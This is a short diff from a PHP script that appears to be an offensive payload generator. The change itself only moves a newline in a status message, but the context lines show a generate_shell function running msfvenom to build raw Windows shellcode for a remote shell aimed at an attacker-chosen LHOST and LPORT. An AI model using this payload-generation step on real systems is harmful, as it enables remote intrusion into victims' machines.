@@ -186,7 +186,7 @@ function generate_shell(){
 	}else{
 	}
 	
-	echo "[*] \n\e[91mGenerating Payload\e[0m . . .\n";
+	echo "\n[*] \e[91mGenerating Payload\e[0m . . .\n";
 	system("msfvenom -p {$lpayload} LHOST={$lhost} LPORT={$lport} --arch x86 --platform windows --smallest -f raw > raw_shellcode.txt");
 	$ascar = array();
 	$hxar = array();
